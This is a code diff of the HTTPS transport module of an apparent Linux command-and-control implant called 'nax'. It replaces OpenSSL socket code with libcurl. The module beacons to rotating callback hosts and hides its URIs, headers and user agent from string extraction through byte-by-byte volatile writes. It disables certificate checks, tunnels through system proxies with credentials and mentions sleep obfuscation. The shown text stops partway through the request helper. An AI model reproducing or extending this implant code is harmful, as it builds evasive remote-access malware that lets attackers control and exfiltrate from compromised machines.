@@ -1,16 +1,30 @@
-/* nax_linux/src/Transport/https.c */
+/* nax_linux/src/Transport/https.c — libcurl backend
+ *
+ * Replaces the hand-rolled OpenSSL/HTTP implementation.
+ * All external symbols and behaviour are preserved:
+ *   - volatile-write string init  (NAX_URI_GET_WRITE / NAX_UA_WRITE / …)
+ *   - profile rotate (nax_profile_*)
+ *   - proxy detection via env vars (https_proxy / HTTPS_PROXY / http_proxy / HTTP_PROXY)
+ *   - pre-profile POST  (X-Beacon-Id header, body raw)
+ *   - post-profile GET/POST (nax_encode_* / nax_build_request_headers / nax_decode_server_output)
+ *   - nax_send_tunnel_result()  — called from tunnel.c
+ *   - nax_https_main()          — agent entry point
+ *   - sleep obfuscation with memfd key
+ *
+ * Build:  add -DNAX_HTTPS_MODE and link -lcurl (replaces -lssl -lcrypto).
+ */
 
 #ifdef NAX_HTTPS_MODE
 
 #include "nax_linux.h"
 #include "opsec.h"
 #include "nax_bof_sdk.h"
-#include <openssl/ssl.h>
-#include <openssl/err.h>
+
+#include <curl/curl.h>
+
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
-#include <netinet/in.h>
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <string.h>
@@ -31,10 +45,7 @@
 #  endif
 #endif
 
-/* ===== compile-time defaults ===== */
-/* Pre-profile URIs, headers, and UA are built at runtime from volatile
- * writes (nax_config.h) to prevent string extraction from the binary.
- * Initialized once in nax_https_init_strings(). */
+/* ===== compile-time defaults (volatile-write anti-extraction) ===== */
 char g_uri_get[64];
 char g_uri_post[64];
 static char g_user_agent[256];
@@ -42,7 +53,8 @@ char g_beacon_hdr[32];
 char g_public_hdr[32];
 static int  g_strings_init = 0;
 
-static void nax_https_init_strings(void) {
+static void nax_https_init_strings(void)
+{
     if (g_strings_init) return;
     g_strings_init = 1;
 
@@ -53,23 +65,24 @@ static void nax_https_init_strings(void) {
     { volatile char *p = (volatile char *)g_beacon_hdr; NAX_BEACON_HDR_WRITE(p); }
     { volatile char *p = (volatile char *)g_public_hdr; NAX_PUBLIC_HDR_WRITE(p); }
 #else
-    g_uri_get[0]='/';g_uri_get[1]='n';g_uri_get[2]='e';g_uri_get[3]='w';
-    g_uri_get[4]='s';g_uri_get[5]='/';g_uri_get[6]='f';g_uri_get[7]='e';
-    g_uri_get[8]='e';g_uri_get[9]='d';
-    g_uri_post[0]='/';g_uri_post[1]='a';g_uri_post[2]='p';g_uri_post[3]='i';
-    g_uri_post[4]='/';g_uri_post[5]='s';g_uri_post[6]='u';g_uri_post[7]='b';
-    g_uri_post[8]='m';g_uri_post[9]='i';g_uri_post[10]='t';
-    g_beacon_hdr[0]='X';g_beacon_hdr[1]='-';g_beacon_hdr[2]='B';g_beacon_hdr[3]='e';
-    g_beacon_hdr[4]='a';g_beacon_hdr[5]='c';g_beacon_hdr[6]='o';g_beacon_hdr[7]='n';
-    g_beacon_hdr[8]='-';g_beacon_hdr[9]='I';g_beacon_hdr[10]='d';
-    g_public_hdr[0]='X';g_public_hdr[1]='-';g_public_hdr[2]='N';g_public_hdr[3]='a';
-    g_public_hdr[4]='X';g_public_hdr[5]='-';g_public_hdr[6]='P';g_public_hdr[7]='u';
-    g_public_hdr[8]='b';g_public_hdr[9]='l';g_public_hdr[10]='i';g_public_hdr[11]='c';
-    g_user_agent[0]='M';g_user_agent[1]='o';g_user_agent[2]='z';
+    g_uri_get[0]='/'; g_uri_get[1]='n'; g_uri_get[2]='e'; g_uri_get[3]='w';
+    g_uri_get[4]='s'; g_uri_get[5]='/'; g_uri_get[6]='f'; g_uri_get[7]='e';
+    g_uri_get[8]='e'; g_uri_get[9]='d';
+    g_uri_post[0]='/'; g_uri_post[1]='a'; g_uri_post[2]='p'; g_uri_post[3]='i';
+    g_uri_post[4]='/'; g_uri_post[5]='s'; g_uri_post[6]='u'; g_uri_post[7]='b';
+    g_uri_post[8]='m'; g_uri_post[9]='i'; g_uri_post[10]='t';
+    g_beacon_hdr[0]='X'; g_beacon_hdr[1]='-'; g_beacon_hdr[2]='B'; g_beacon_hdr[3]='e';
+    g_beacon_hdr[4]='a'; g_beacon_hdr[5]='c'; g_beacon_hdr[6]='o'; g_beacon_hdr[7]='n';
+    g_beacon_hdr[8]='-'; g_beacon_hdr[9]='I'; g_beacon_hdr[10]='d';
+    g_public_hdr[0]='X'; g_public_hdr[1]='-'; g_public_hdr[2]='N'; g_public_hdr[3]='a';
+    g_public_hdr[4]='X'; g_public_hdr[5]='-'; g_public_hdr[6]='P'; g_public_hdr[7]='u';
+    g_public_hdr[8]='b'; g_public_hdr[9]='l'; g_public_hdr[10]='i'; g_public_hdr[11]='c';
+    g_user_agent[0]='M'; g_user_agent[1]='o'; g_user_agent[2]='z';
 #endif
 }
+
 #ifndef NAX_C2_PORT
-#  define NAX_C2_PORT       443
+#  define NAX_C2_PORT 443
 #endif
 
 /* ===== NaxSysInfo forward (defined in sysinfo.c) ===== */
@@ -119,40 +132,101 @@ extern const char *nax_profile_get_uri(void);
 extern const char *nax_profile_post_uri(void);
 extern int         nax_profile_loaded(void);
 extern int         nax_is_empty_resp(const uint8_t *data, uint32_t data_len);
-extern uint8_t     nax_profile_rotation(void);         /* 0=sequential, 1=random */
-extern const char *nax_profile_get_uri_rotate(void);   /* rotate GET URI index */
-extern const char *nax_profile_post_uri_rotate(void);  /* rotate POST URI index */
+extern uint8_t     nax_profile_rotation(void);
+extern const char *nax_profile_get_uri_rotate(void);
+extern const char *nax_profile_post_uri_rotate(void);
 extern uint8_t     nax_profile_callbacks_count(void);
 extern int         nax_profile_callback_host(uint8_t idx, char *host, uint16_t *port);
-/* Encode body according to profile ClientMeta/ClientOutput config.
- * Returns encoded length, 0 on error. out_buf must be large enough. */
 extern uint32_t    nax_encode_get_meta(const uint8_t *body, uint32_t body_len,
                                           char *out_buf, uint32_t out_cap);
 extern uint32_t    nax_encode_post_meta(const uint8_t *body, uint32_t body_len,
                                          char *out_buf, uint32_t out_cap);
 extern uint32_t    nax_encode_post_output(const uint8_t *body, uint32_t body_len,
                                            char *out_buf, uint32_t out_cap);
-/* Returns extra HTTP headers string (beacon_id + custom headers + meta placement).
- * cookie/header placement for ClientMeta is included here.
- * meta_enc / meta_enc_len: the already-encoded ClientMeta value. */
 extern uint32_t    nax_build_request_headers(const char *sid,
                                               const char *meta_enc, uint32_t meta_enc_len,
                                               int is_get,
                                               char *hdr_buf, uint32_t hdr_cap);
-/* Decode server output (strip prepend/append, base64 decode, unmask).
- * Returns decoded length, 0 on error. */
 extern uint32_t    nax_decode_server_output(const uint8_t *enc, uint32_t enc_len,
                                              int is_get,
                                              uint8_t *out, uint32_t out_cap);
-/* NaxSysInfo defined above */
+extern void nax_profile_xor(const uint8_t *key, uint32_t key_len);
+extern int  nax_profile_apply_pending(void);
 
-/* ===== TLS state ===== */
-static SSL_CTX *g_ssl_ctx = NULL;
-static SSL     *g_ssl     = NULL;
-static int      g_sock    = -1;
+/* ===== global mutex — libcurl handles are not shared ===== */
 static pthread_mutex_t g_https_mutex = PTHREAD_MUTEX_INITIALIZER;
 
-/* ===== session ID (identical to tcp.c) ===== */
+/* ===== callback host rotation (same logic as original) ===== */
+static uint8_t  g_host_idx  = 0;
+static char     g_cur_host[256] = {0};
+static uint16_t g_cur_port  = 0;
+
+#ifdef NAX_CB_HOST_COUNT
+static void nax_get_compiled_host(uint8_t idx, char *host, uint16_t *port)
+{
+    uint8_t port_buf[2] = {0};
+    switch (idx) {
+#  ifdef NAX_CB_HOST_0_WRITE
+    case 0: { volatile char *h=(volatile char*)host; NAX_CB_HOST_0_WRITE(h);
+              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_0_WRITE(p); } break;
+#  endif
+#  ifdef NAX_CB_HOST_1_WRITE
+    case 1: { volatile char *h=(volatile char*)host; NAX_CB_HOST_1_WRITE(h);
+              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_1_WRITE(p); } break;
+#  endif
+#  ifdef NAX_CB_HOST_2_WRITE
+    case 2: { volatile char *h=(volatile char*)host; NAX_CB_HOST_2_WRITE(h);
+              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_2_WRITE(p); } break;
+#  endif
+#  ifdef NAX_CB_HOST_3_WRITE
+    case 3: { volatile char *h=(volatile char*)host; NAX_CB_HOST_3_WRITE(h);
+              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_3_WRITE(p); } break;
+#  endif
+    default: break;
+    }
+    *port = (uint16_t)port_buf[0] | ((uint16_t)port_buf[1] << 8);
+}
+#endif /* NAX_CB_HOST_COUNT */
+
+static void https_rotate_host(NaxAgent *a)
+{
+    uint8_t count = nax_profile_callbacks_count();
+    if (count > 0) {
+        uint8_t rotation = nax_profile_rotation();
+        if (rotation == 1) {
+            FILE *f = fopen("/dev/urandom", "rb");
+            uint8_t r = 0;
+            if (f) { fread(&r, 1, 1, f); fclose(f); }
+            g_host_idx = r % count;
+        }
+        char host[256] = {0}; uint16_t port = 0;
+        if (nax_profile_callback_host(g_host_idx, host, &port) == 0) {
+            strncpy(g_cur_host, host, sizeof(g_cur_host) - 1);
+            g_cur_port = port;
+        }
+        if (rotation != 1)
+            g_host_idx = (g_host_idx + 1) % count;
+        return;
+    }
+
+#ifdef NAX_CB_HOST_COUNT
+    uint8_t cb_count = NAX_CB_HOST_COUNT;
+    if (cb_count > 0) {
+        char host[256] = {0}; uint16_t port = 0;
+        nax_get_compiled_host(g_host_idx, host, &port);
+        if (host[0]) {
+            strncpy(g_cur_host, host, sizeof(g_cur_host) - 1);
+            g_cur_port = port;
+        }
+        g_host_idx = (g_host_idx + 1) % cb_count;
+        return;
+    }
+#endif
+    strncpy(g_cur_host, a->cfg.c2_host, sizeof(g_cur_host) - 1);
+    g_cur_port = (uint16_t)a->cfg.c2_port;
+}
+
+/* ===== session ID (identical to tcp.c / original https.c) ===== */
 static void gen_session_id(char *out)
 {
     uint8_t raw[8] = {0};
@@ -200,421 +274,209 @@ static void gen_session_id(char *out)
     out[16] = '\0';
 }
 
-/* ===== low-level TLS I/O ===== */
-static int tls_write_all(const void *buf, int len) {
-    int sent = 0;
-    while (sent < len) {
-        int r = SSL_write(g_ssl, (const char *)buf + sent, len - sent);
-        if (r <= 0) return -1;
-        sent += r;
-    }
-    return 0;
-}
-static int tls_read_line(char *buf, int max) {
-    int n = 0;
-    while (n < max - 1) {
-        char c;
-        if (SSL_read(g_ssl, &c, 1) <= 0) return -1;
-        buf[n++] = c;
-        if (c == '\n') break;
-    }
-    buf[n] = '\0';
-    return n;
-}
-static void tls_drain(int len) __attribute__((unused)); static void tls_drain(int len) {
-    char tmp[512];
-    while (len > 0) {
-        int chunk = len < (int)sizeof(tmp) ? len : (int)sizeof(tmp);
-        int r = SSL_read(g_ssl, tmp, chunk);
-        if (r <= 0) break;
-        len -= r;
-    }
-}
-static uint8_t *tls_read_body(int len, uint32_t *out_len) {
-    if (len <= 0) return NULL;
-    uint8_t *buf = (uint8_t *)malloc((size_t)len);
-    if (!buf) return NULL;
-    int got = 0;
-    while (got < len) {
-        int r = SSL_read(g_ssl, buf + got, len - got);
-        if (r <= 0) { free(buf); return NULL; }
-        got += r;
-    }
-    *out_len = (uint32_t)len;
-    return buf;
-}
-static int read_http_headers(void) {
-    char line[512];
-    /* Read status line */
-    if (tls_read_line(line, sizeof(line)) < 0) return -1;
-    int status = 0;
-    int chunked = 0;
-    if (strncmp(line, "HTTP/", 5) == 0) {
-        char *sp = strchr(line, ' ');
-        if (sp) status = atoi(sp + 1);
-    }
-    int clen = 0;
-    for (;;) {
-        if (tls_read_line(line, sizeof(line)) < 0) break;
-        if (line[0] == '\r' || line[0] == '\n') break;
-        if (strncasecmp(line, "Content-Length:", 15) == 0)
-            clen = atoi(line + 15);
-        if (strncasecmp(line, "Transfer-Encoding:", 18) == 0 &&
-            strstr(line, "chunked"))
-            chunked = 1;
-    }
-    if (status != 200 && status != 0) {
-        tls_drain(clen);
-        return -1;
-    }
-    /* Handle chunked transfer encoding: read first chunk size */
-    if (chunked) {
-        char sz_line[64];
-        if (tls_read_line(sz_line, sizeof(sz_line)) < 0) return -1;
-        clen = (int)strtol(sz_line, NULL, 16);
-    }
-    return clen;
-}
-
-/* ===== TLS connect ===== */
-/* Current active callback host (rotates on failure) */
-static uint8_t  g_host_idx    = 0;
-static char     g_cur_host[256] = {0};
-static uint16_t g_cur_port    = 0;
-
-/* Pre-profile compiled-in callback hosts from nax_config.h */
-#ifdef NAX_CB_HOST_COUNT
-static void nax_get_compiled_host(uint8_t idx, char *host, uint16_t *port) {
-    /* Macros write the host string and port bytes into provided buffers */
-    uint8_t port_buf[2] = {0};
-    switch (idx) {
-#  ifdef NAX_CB_HOST_0_WRITE
-    case 0: { volatile char *h=(volatile char*)host; NAX_CB_HOST_0_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_0_WRITE(p); } break;
-#  endif
-#  ifdef NAX_CB_HOST_1_WRITE
-    case 1: { volatile char *h=(volatile char*)host; NAX_CB_HOST_1_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_1_WRITE(p); } break;
-#  endif
-#  ifdef NAX_CB_HOST_2_WRITE
-    case 2: { volatile char *h=(volatile char*)host; NAX_CB_HOST_2_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_2_WRITE(p); } break;
-#  endif
-#  ifdef NAX_CB_HOST_3_WRITE
-    case 3: { volatile char *h=(volatile char*)host; NAX_CB_HOST_3_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_3_WRITE(p); } break;
-#  endif
-#  ifdef NAX_CB_HOST_4_WRITE
-    case 4: { volatile char *h=(volatile char*)host; NAX_CB_HOST_4_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_4_WRITE(p); } break;
-#  endif
-#  ifdef NAX_CB_HOST_5_WRITE
-    case 5: { volatile char *h=(volatile char*)host; NAX_CB_HOST_5_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_5_WRITE(p); } break;
-#  endif
-#  ifdef NAX_CB_HOST_6_WRITE
-    case 6: { volatile char *h=(volatile char*)host; NAX_CB_HOST_6_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_6_WRITE(p); } break;
-#  endif
-#  ifdef NAX_CB_HOST_7_WRITE
-    case 7: { volatile char *h=(volatile char*)host; NAX_CB_HOST_7_WRITE(h);
-              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_7_WRITE(p); } break;
-#  endif
-    default: break;
-    }
-    *port = (uint16_t)port_buf[0] | ((uint16_t)port_buf[1] << 8);
-}
-#endif /* NAX_CB_HOST_COUNT */
-
-static void https_rotate_host(NaxAgent *a) {
-    /* Post-profile: use hosts from parsed profile */
-    uint8_t count = nax_profile_callbacks_count();
-    if (count > 0) {
-        uint8_t rotation = nax_profile_rotation();
-        if (rotation == 1) {
-            FILE *f = fopen("/dev/urandom","rb");
-            uint8_t r = 0;
-            if (f) { fread(&r, 1, 1, f); fclose(f); }
-            g_host_idx = r % count;
-        }
-        char host[256] = {0}; uint16_t port = 0;
-        if (nax_profile_callback_host(g_host_idx, host, &port) == 0) {
-            strncpy(g_cur_host, host, sizeof(g_cur_host)-1);
-            g_cur_port = port;
-        }
-        if (rotation != 1)
-            g_host_idx = (g_host_idx + 1) % count;
-        return;
-    }
-
-    /* Pre-profile: use compiled-in hosts from nax_config.h */
-#ifdef NAX_CB_HOST_COUNT
-    uint8_t cb_count = NAX_CB_HOST_COUNT;
-    if (cb_count > 0) {
-        char host[256] = {0}; uint16_t port = 0;
-        nax_get_compiled_host(g_host_idx, host, &port);
-        if (host[0]) {
-            strncpy(g_cur_host, host, sizeof(g_cur_host)-1);
-            g_cur_port = port;
-        }
-        g_host_idx = (g_host_idx + 1) % cb_count;
-        return;
-    }
-#endif
-    /* Fallback: single compiled-in host */
-    strncpy(g_cur_host, a->cfg.c2_host, sizeof(g_cur_host)-1);
-    g_cur_port = (uint16_t)a->cfg.c2_port;
-}
-
-/* ===== Proxy detection and HTTP CONNECT ===== */
-
+/* ===== libcurl response buffer ===== */
 typedef struct {
-    char host[256];
-    uint16_t port;
-    char user[128];
-    char pass[128];
-    int has_auth;
-} proxy_info_t;
+    uint8_t *data;
+    size_t   size;
+} curl_buf_t;
 
-static proxy_info_t g_proxy = {0};
-static int g_proxy_detected = 0;
-static int g_proxy_checked  = 0;
-
-/* Base64 encode for Proxy-Authorization header */
-static int _b64_encode_proxy(const char *in, size_t in_len, char *out, size_t out_cap) {
-    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    size_t o = 0;
-    for (size_t i = 0; i < in_len; i += 3) {
-        if (o + 4 >= out_cap) return -1;
-        unsigned int v = (unsigned char)in[i] << 16;
-        if (i + 1 < in_len) v |= (unsigned char)in[i+1] << 8;
-        if (i + 2 < in_len) v |= (unsigned char)in[i+2];
-        out[o++] = t[(v >> 18) & 0x3F];
-        out[o++] = t[(v >> 12) & 0x3F];
-        out[o++] = (i + 1 < in_len) ? t[(v >> 6) & 0x3F] : '=';
-        out[o++] = (i + 2 < in_len) ? t[v & 0x3F] : '=';
-    }
-    out[o] = '\0';
-    return (int)o;
-}
-
-/* Parse proxy URL: http://user:pass@host:port or http://host:port */
-static int _parse_proxy_url(const char *url, proxy_info_t *pi) {
-    memset(pi, 0, sizeof(*pi));
-    const char *p = url;
-
-    /* Skip scheme */
-    if (strncmp(p, "http://", 7) == 0) p += 7;
-    else if (strncmp(p, "https://", 8) == 0) p += 8;
-
-    /* Check for user:pass@ */
-    const char *at = strchr(p, '@');
-    if (at) {
-        const char *colon = strchr(p, ':');
-        if (colon && colon < at) {
-            size_t ulen = (size_t)(colon - p);
-            size_t plen = (size_t)(at - colon - 1);
-            if (ulen >= sizeof(pi->user) || plen >= sizeof(pi->pass)) return -1;
-            memcpy(pi->user, p, ulen); pi->user[ulen] = '\0';
-            memcpy(pi->pass, colon + 1, plen); pi->pass[plen] = '\0';
-            pi->has_auth = 1;
-        }
-        p = at + 1;
-    }
-
-    /* Parse host:port */
-    const char *colon = strchr(p, ':');
-    const char *slash = strchr(p, '/');
-    if (colon) {
-        size_t hlen = (size_t)(colon - p);
-        if (hlen >= sizeof(pi->host)) return -1;
-        memcpy(pi->host, p, hlen); pi->host[hlen] = '\0';
-        pi->port = (uint16_t)atoi(colon + 1);
-    } else {
-        size_t hlen = slash ? (size_t)(slash - p) : strlen(p);
-        if (hlen >= sizeof(pi->host)) return -1;
-        memcpy(pi->host, p, hlen); pi->host[hlen] = '\0';
-        pi->port = 8080;
-    }
-    return (pi->host[0] && pi->port) ? 0 : -1;
-}
-
-/* Detect proxy from environment variables */
-static void _detect_proxy(void) {
-    if (g_proxy_checked) return;
-    g_proxy_checked = 1;
-
-    const char *env = getenv("https_proxy");
-    if (!env) env = getenv("HTTPS_PROXY");
-    if (!env) env = getenv("http_proxy");
-    if (!env) env = getenv("HTTP_PROXY");
-    if (!env) return;
-
-    if (_parse_proxy_url(env, &g_proxy) == 0) {
-        g_proxy_detected = 1;
-        DBG("proxy detected: %s:%u (auth=%s)",
-            g_proxy.host, g_proxy.port, g_proxy.has_auth ? "yes" : "no");
-    }
-}
-
-/* Connect TCP to a host:port */
-static int _tcp_connect(const char *host, uint16_t port) {
-    char port_str[8];
-    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);
-
-    struct addrinfo hints = {0}, *res = NULL;
-    hints.ai_family   = AF_INET;
-    hints.ai_socktype = SOCK_STREAM;
-    if (getaddrinfo(host, port_str, &hints, &res) != 0) return -1;
-
-    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
-    if (sock < 0) { freeaddrinfo(res); return -1; }
-
-    struct timeval tv = {10, 0};
-    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-
-    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
-        close(sock); freeaddrinfo(res); return -1;
-    }
-    freeaddrinfo(res);
-    return sock;
-}
-
-/* Send HTTP CONNECT through proxy and wait for 200 */
-static int _proxy_connect(int sock, const char *target_host, uint16_t target_port) {
-    char req[1024];
-    int rlen;
-
-    if (g_proxy.has_auth) {
-        /* Build "user:pass" and base64 encode it */
-        char cred[256];
-        int clen = snprintf(cred, sizeof(cred), "%s:%s", g_proxy.user, g_proxy.pass);
-        char b64[512];
-        _b64_encode_proxy(cred, (size_t)clen, b64, sizeof(b64));
-        memset(cred, 0, sizeof(cred)); /* zero credentials */
-
-        rlen = snprintf(req, sizeof(req),
-            "CONNECT %s:%u HTTP/1.1\r\n"
-            "Host: %s:%u\r\n"
-            "Proxy-Authorization: Basic %s\r\n"
-            "\r\n",
-            target_host, target_port,
-            target_host, target_port,
-            b64);
-        memset(b64, 0, sizeof(b64));
-    } else {
-        rlen = snprintf(req, sizeof(req),
-            "CONNECT %s:%u HTTP/1.1\r\n"
-            "Host: %s:%u\r\n"
-            "\r\n",
-            target_host, target_port,
-            target_host, target_port);
-    }
-
-    /* Send CONNECT request */
-    const char *p = req;
-    int rem = rlen;
-    while (rem > 0) {
-        ssize_t n = send(sock, p, rem, 0);
-        if (n <= 0) return -1;
-        p += n; rem -= (int)n;
-    }
-
-    /* Read response — look for "HTTP/1.x 200" */
-    char resp[1024];
-    int total = 0;
-    while (total < (int)sizeof(resp) - 1) {
-        ssize_t n = recv(sock, resp + total, 1, 0);
-        if (n <= 0) return -1;
-        total += (int)n;
-        /* Check if we got the end of headers */
-        if (total >= 4 &&
-            resp[total-4] == '\r' && resp[total-3] == '\n' &&
-            resp[total-2] == '\r' && resp[total-1] == '\n') break;
-    }
-    resp[total] = '\0';
-
-    /* Verify 200 status */
-    if (strncmp(resp, "HTTP/1.", 7) != 0) return -1;
-    int status = atoi(resp + 9);
-    if (status != 200) {
-        DBG_ERR("proxy CONNECT failed: status %d", status);
-        return -1;
-    }
-
-    DBG("proxy CONNECT tunnel established to %s:%u", target_host, target_port);
-    return 0;
-}
-
-static int https_tls_connect(NaxAgent *a)
+static size_t curl_write_cb(void *ptr, size_t sz, size_t nmemb, void *userdata)
 {
-    /* Use current rotated host */
+    curl_buf_t *b = (curl_buf_t *)userdata;
+    size_t total  = sz * nmemb;
+    uint8_t *tmp  = (uint8_t *)realloc(b->data, b->size + total);
+    if (!tmp) return 0;
+    b->data = tmp;
+    memcpy(b->data + b->size, ptr, total);
+    b->size += total;
+    return total;
+}
+
+/* ===== build URL from current host/port + URI ===== */
+static void build_url(const NaxAgent *a, const char *uri, char *url_out, size_t url_cap)
+{
     const char *host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
     uint16_t    port = g_cur_port    ? g_cur_port  : (uint16_t)a->cfg.c2_port;
-
-    /* Detect proxy on first connection attempt */
-    _detect_proxy();
-
-    int sock;
-    if (g_proxy_detected) {
-        /* Connect to proxy, then HTTP CONNECT tunnel to C2 */
-        sock = _tcp_connect(g_proxy.host, g_proxy.port);
-        if (sock < 0) return -1;
-        if (_proxy_connect(sock, host, port) < 0) {
-            close(sock); return -1;
-        }
-    } else {
-        /* Direct connection to C2 */
-        sock = _tcp_connect(host, port);
-        if (sock < 0) return -1;
-    }
-    if (!g_ssl_ctx) {
-        g_ssl_ctx = SSL_CTX_new(TLS_client_method());
-        if (!g_ssl_ctx) { close(sock); return -1; }
-        SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
-    }
-    if (g_ssl) { SSL_free(g_ssl); g_ssl = NULL; }
-    g_ssl = SSL_new(g_ssl_ctx);
-    if (!g_ssl) { close(sock); return -1; }
-    SSL_set_fd(g_ssl, sock);
-    SSL_set_tlsext_host_name(g_ssl, host);
-    if (SSL_connect(g_ssl) != 1) {
-        SSL_free(g_ssl); g_ssl = NULL; close(sock); return -1;
-    }
-    g_sock = sock;
-    return 0;
+    snprintf(url_out, url_cap, "https://%s:%u%s", host, (unsigned)port, uri);
 }
-static void https_cleanup(void) {
-    if (g_ssl) { SSL_shutdown(g_ssl); SSL_free(g_ssl); g_ssl = NULL; }
-    if (g_sock >= 0) { close(g_sock); g_sock = -1; }
+
+/* ===== parse "Key: Value\r\n..." header blob into curl slist ===== */
+/* nax_build_request_headers() returns a single buffer of HTTP header lines.
+ * We split it and feed each line to curl_slist_append().
+ * Lines with an empty value after the colon are skipped (curl rejects them). */
+static struct curl_slist *headers_to_slist(const char *hdr_buf, uint32_t hdr_len)
+{
+    struct curl_slist *list = NULL;
+    char tmp[4096];
+    size_t cap = sizeof(tmp);
+
+    const char *p   = hdr_buf;
+    const char *end = hdr_buf + hdr_len;
+
+    while (p < end) {
+        /* Find end of line (\r\n or \n) */
+        const char *nl = p;
+        while (nl < end && *nl != '\n') nl++;
+        size_t line_len = (size_t)(nl - p);
+        if (nl < end) nl++; /* skip \n */
+
+        /* Strip trailing \r */
+        while (line_len > 0 && p[line_len - 1] == '\r') line_len--;
+
+        if (line_len == 0) { p = nl; continue; }
+        if (line_len >= cap) { p = nl; continue; }
+
+        memcpy(tmp, p, line_len);
+        tmp[line_len] = '\0';
+        list = curl_slist_append(list, tmp);
+        p = nl;
+    }
+    return list;
+}
+
+/* ===== core libcurl request helper ===== */
+/*
+ * is_get   : 1 = GET (heartbeat), 0 = POST (result/register)
+ * extra_hdrs: raw "Key: Value\r\n" header block (may be NULL)
+ * extra_len : byte length of extra_hdrs block
+ * post_body / post_len : POST body (ignored when is_get=1)
+ *
+ * Returns allocated buffer with response body (caller must free).
+ * *out_len = response byte count, or UINT32_MAX on network/HTTP error.
+ */
+static uint8_t *curl_do_request(NaxAgent *a,
+                                 const char *url,
+                                 int is_get,
+                                 const char *extra_hdrs, uint32_t extra_len,
+                                 const uint8_t *post_body, uint32_t post_len,
+                                 uint32_t *out_len)
+{
+    *out_len = UINT32_MAX;
+
+    CURL *curl = curl_easy_init();
+    if (!curl) return NULL;
+
+    curl_buf_t resp = {NULL, 0};
+
+    /* ── URL ── */
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+    /* ── HTTP/2 — forzado, sin fallback a 1.1 ── */
+    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
+
+    /* ── TLS ── */
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+
+    /* SNI: set from current host (already embedded in URL, but be explicit) */
+    {
+        const char *sni = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
+        curl_easy_setopt(curl, CURLOPT_SSL_OPTIONS, (long)0);
+        /* CURLOPT_PINNEDPUBLICKEY not set — we trust blindly like the original */
+        (void)sni; /* SNI is derived automatically from the hostname in the URL */
+    }
+
+    /* ── Proxy: leer explícitamente del entorno (misma prioridad que el original).
+     * https_proxy > HTTPS_PROXY > http_proxy > HTTP_PROXY */
+    {
+        const char *proxy_url = getenv("https_proxy");
+        if (!proxy_url) proxy_url = getenv("HTTPS_PROXY");
+        if (!proxy_url) proxy_url = getenv("http_proxy");
+        if (!proxy_url) proxy_url = getenv("HTTP_PROXY");
+        if (proxy_url && proxy_url[0]) {
+            curl_easy_setopt(curl, CURLOPT_PROXY, proxy_url);
+            curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC | CURLAUTH_NTLM);
+            DBG("proxy: %s", proxy_url);
+        }
+    }
+
+    /* ── User-Agent ── */
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, g_user_agent[0] ? g_user_agent : "Mozilla/5.0");
+
+    /* ── Timeout ── */
+    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
+
+    /* ── Method + body ── */
+    if (is_get) {
+        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
+    } else {
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS,  (const char *)post_body);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)post_len);
+    }
+
+    /* ── Extra headers ── */
+    struct curl_slist *hlist = NULL;
+    /* Disable curl's default "Expect: 100-continue" on POST */
+    hlist = curl_slist_append(hlist, "Expect:");
+
+    if (extra_hdrs && extra_len > 0) {
+        struct curl_slist *extra = headers_to_slist(extra_hdrs, extra_len);
+        /* Merge: walk extra and append each node to hlist */
+        struct curl_slist *node = extra;
+        while (node) {
+            hlist = curl_slist_append(hlist, node->data);
+            node  = node->next;
+        }
+        curl_slist_free_all(extra);
+    }
+
+    if (hlist)
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hlist);
+
+    /* ── Response ── */
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
+
+    /* ── Perform ── */
+    CURLcode rc = curl_easy_perform(curl);
+
+    if (hlist) curl_slist_free_all(hlist);
+
+    if (rc != CURLE_OK) {
+        DBG_ERR("curl error: %s", curl_easy_strerror(rc));
+        curl_easy_cleanup(curl);
+        if (resp.data) free(resp.data);
+        return NULL;
+    }
+
+    long http_code = 0;
+    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
+    curl_easy_cleanup(curl);
+
